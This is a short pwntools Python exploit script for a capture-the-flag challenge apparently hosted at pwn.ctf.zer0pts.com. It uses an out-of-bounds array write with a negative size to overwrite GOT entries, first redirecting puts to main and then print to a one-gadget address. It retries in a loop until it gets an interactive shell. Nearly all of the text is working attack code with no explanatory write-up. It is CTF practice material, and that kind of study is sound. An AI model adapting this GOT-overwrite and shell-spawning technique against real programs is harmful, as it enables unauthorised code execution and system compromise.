from pwn import *
import string
context.log_level = 'debug'

# p = process('./chall')
e = ELF('./chall')
# e = ELF('./libc.so.6')

main = 0x400737
puts_Got = 0x601018
print_Got = 0x601028
print_plt = 0x400600
setbuf_Got = 0x601020

setbuf_Index = setbuf_Got//4
print_Index = print_Got//4
puts_Index = puts_Got//4
oneShot = 0xe6c81
oneoneShot = 0xf7eadc81



def genMM(memSize, index, data):
    p.sendlineafter('n = ',str(memSize))
    p.sendlineafter('i = ', str(index))
    p.sendlineafter('arr[%d] = '%index, str(data))



# main return

while True:
    p = remote('pwn.ctf.zer0pts.com', 9004)
    log.info("MAIN RETURN")
    genMM(-1, puts_Index, main)
    sleep(0.1)
    log.info("ONESHOTSHOT : "+hex(oneShot))

    p.sendlineafter('n = ',str(-1))
    p.sendlineafter('i = ', str(print_Index))
    p.sendlineafter('arr[%d] = '%print_Index, str(oneoneShot))
    sleep(0.1)
    try:
        if (not(p.recv().find('Segmentation fault (core dumped)\n'))):
            p.close()
        else:
            p.interactive()
            p.send('id')
            break
    except:
        p.close()
















